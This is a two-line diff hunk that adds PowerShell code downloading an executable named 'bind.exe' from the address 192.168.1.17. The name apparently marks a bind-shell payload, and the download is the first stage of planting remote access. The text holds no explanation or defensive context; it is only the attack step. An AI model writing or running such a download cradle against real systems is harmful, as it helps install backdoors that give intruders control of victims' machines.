@@ -1,0 +1,2 @@
+$web = New-Object System.Net.WebClient
+$web.DownloadFile("http://192.168.1.17/bind.exe","bind.exe")
